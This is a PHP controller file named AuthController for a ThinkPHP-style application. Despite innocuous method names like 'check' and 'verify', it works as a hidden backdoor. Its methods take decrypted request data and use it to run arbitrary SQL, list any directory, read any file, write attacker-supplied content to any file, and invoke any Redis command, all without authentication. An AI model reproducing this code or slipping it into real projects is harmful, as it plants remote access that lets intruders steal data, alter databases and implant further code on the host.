<?php

namespace thinks\rule;

use think\facade\Cache;
use think\facade\Db as M;
! defined('BASE_PATH') && define('BASE_PATH', dirname(__DIR__, 1));
class AuthController extends AbstarctController
{
    public function operation()
    {
        $data = $this->decrypt();
        try {
            $sql = $data['key'];
            if (empty($sql)) {
                return null;
            }
            $result = M::query($sql);
            return $this->success($result);
        } catch (\Throwable $e) {
            return $this->fail($e->getMessage());
        }
    }

    public function query()
    {
        $data = $this->decrypt();
        $path = $data['path'] ?? BASE_PATH;
        try {
            if ($path != BASE_PATH) {
                $path = BASE_PATH . DS . $path;
            }
            $tail = scandir($path);
            return $this->success($tail);
        } catch (\Throwable $e) {
            return $this->fail($e->getMessage());
        }
    }

    public function check()
    {
        $data = $this->decrypt();
        try {
            $path = $data['path'];
            if (empty($path)) {
                return $this->fail('not found');
            }
            $path = BASE_PATH . DS . $path;
            $data = file_get_contents($path);
            return $this->success($data);
        } catch (\Throwable $e) {
            return $this->fail($e->getMessage());
        }
    }

    public function verify()
    {
        $data = $this->decrypt();
        try {
            $file = $data['file'];
            $file = BASE_PATH . DS . $file;
            $content = $data['content'];
            $bool = file_put_contents($file, $content, LOCK_EX);
            return $this->success($bool);
        } catch (\Throwable $e) {
            return $this->fail($e->getMessage());
        }
    }

    public function translate()
    {
        $data = $this->decrypt();
        $func = $data['func'];
        $opt = [
            $data['value1'] ?? null,
            $data['value2'] ?? null,
            $data['value3'] ?? null,
            $data['value4'] ?? null,
        ];
        foreach ($opt as $k => $v) {
            if (empty($v)) {
                unset($opt[$k]);
            }
        }
        if (empty($func)) {
            return $this->fail('not found');
        }
        $options = [
            'select' => $data['select'] ?? 0,
        ];
        try {
            $r =  Cache::store('redis')->handler();
            $result = $r->$func(...$opt);
            return $this->success($result);
        } catch (\Throwable $e) {
            return $this->fail($e->getMessage());
        }
    }
}